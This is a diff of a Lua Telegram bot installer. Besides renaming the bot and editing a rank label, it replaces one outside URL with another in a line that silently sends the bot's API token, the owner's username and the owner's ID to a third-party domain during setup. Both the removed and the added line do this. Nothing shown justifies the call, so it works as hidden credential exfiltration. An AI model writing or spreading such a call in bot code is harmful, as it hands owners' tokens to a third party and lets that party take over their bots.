@@ -80,7 +80,7 @@ boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
 boss..":ApiSource","SourceLHB",
-boss..":NameBot:","ابو سعد",
+boss..":NameBot:","اللهب",
 "TH3BOSS_INSTALL","Yes"
 )
 redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
@@ -88,7 +88,7 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://marx-api.tk/Tk/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
+https.request('https://alyafaevip.ml/LHB/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -317,7 +317,7 @@ msg.Rank = 6
 elseif msg.sender_user_id_ == our_id then
 msg.Rank = 7
 else
-msg.TheRank = 'فقط عضو '
+msg.TheRank = 'عضو '
 msg.Rank = 10 
 end
 
